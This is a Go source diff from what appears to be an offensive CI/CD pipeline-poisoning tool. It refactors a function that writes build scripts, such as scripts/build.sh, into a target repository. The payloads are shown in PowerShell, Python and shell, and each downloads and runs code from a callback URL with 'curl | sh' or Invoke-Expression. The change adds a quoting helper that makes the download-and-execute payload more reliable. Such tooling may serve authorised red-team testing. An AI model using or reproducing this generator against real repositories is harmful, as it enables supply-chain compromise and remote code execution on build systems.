@@ -1148,10 +1148,10 @@ func dynamicScriptFiles(tool string, targets []string, callbackURL string) []lot
 		payload = fmt.Sprintf("Invoke-Expression (Invoke-WebRequest -Uri '%s').Content", callbackURL)
 	case "python":
 		shebang = "#!/usr/bin/env python3"
-		payload = fmt.Sprintf("import os; os.system('curl -s %s | sh')", callbackURL)
+		payload = fmt.Sprintf("import os; os.system(%q)", shellCurlPipeShCommand(callbackURL))
 	default:
 		shebang = "#!/bin/sh"
-		payload = fmt.Sprintf("curl -s %s | sh", callbackURL)
+		payload = shellCurlPipeShCommand(callbackURL)
 	}
 
 	content := shebang + "\n" + payload + "\n"
@@ -1164,6 +1164,10 @@ func dynamicScriptFiles(tool string, targets []string, callbackURL string) []lot
 		files = append(files, lotpFile{path: "scripts/build.sh", content: content})
 	}
 	return files
+}
+
+func shellCurlPipeShCommand(callbackURL string) string {
+	return fmt.Sprintf("curl -s '%s' | sh", strings.ReplaceAll(callbackURL, "'", "'\"'\"'"))
 }
 
 func lotpFilesToCommit(payload *lotp.GeneratedPayload, tool string, targets []string, callbackURL string) []lotpFile {
